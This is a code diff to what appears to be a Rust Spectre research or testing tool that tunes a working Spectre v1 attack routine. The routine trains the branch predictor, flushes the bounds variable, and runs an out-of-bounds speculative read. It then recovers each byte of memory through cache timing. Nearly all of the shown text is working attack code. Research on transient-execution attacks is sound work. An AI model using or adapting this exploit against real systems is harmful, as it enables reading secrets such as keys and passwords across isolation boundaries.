@@ -26,8 +26,8 @@ pub static mut MIN_NB_CYCLES: u64 = 0;
 #[no_mangle]
 pub static mut SPECTRE_LIMIT: u64 = 64;
 #[no_mangle]
-pub static mut MINIDOW_SECRET: &[u8; 64] =
-    b"0000000000000000000000000000000000000000000000000000000000000000";
+pub static MINIDOW_SECRET: &[u8; 128] =
+    b"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
 
 #[cfg(feature = "tester")]
 pub trait Method {
@@ -84,34 +84,32 @@ impl Method for Spectre {
     const NB_CYCLES_OFFSET: u64 = 25;
 
     unsafe fn perform(preload_op: unsafe fn(), target_address: *const u8, dest_array: &mut [u8]) {
-        let target =
-            (Wrapping(target_address as usize) - Wrapping(MINIDOW_SECRET as *const _ as usize)).0;
+        let target = (Wrapping(target_address as usize)
+            - Wrapping(&MINIDOW_SECRET[64] as *const _ as usize))
+        .0;
         let limit = SPECTRE_LIMIT as usize;
+        let base_addr = BASE_ADDR;
 
         for i in 0..dest_array.len() {
             let mut found = false;
             for _ in 0..1000 {
                 // training phase
-                for i in 0..100000 {
-                    access_memory_spectre(BASE_ADDR, i % limit);
+                for i in 0..10_000 {
+                    access_memory_spectre(base_addr, i % limit);
                 }
 
                 // attack phase
                 flush_measurement_area();
                 core::arch::x86_64::_mm_prefetch(
-                    &MINIDOW_SECRET[0] as *const _ as *const i8,
+                    &MINIDOW_SECRET[64] as *const _ as *const i8,
                     core::arch::x86_64::_MM_HINT_T0,
                 );
-                core::arch::x86_64::_mm_prefetch(
-                    &BASE_ADDR as *const usize as *const i8,
-                    core::arch::x86_64::_MM_HINT_T0,
-                );
-                core::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const u64 as *const u8);
+                core::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const _ as *const u8);
 
                 preload_op();
                 asm!("mfence", "lfence");
 
-                access_memory_spectre(BASE_ADDR, target + i);
+                access_memory_spectre(base_addr, target + i);
 
                 let measured_byte = measure_byte::<Self>().unwrap_or(0);
                 if measured_byte != 0 {
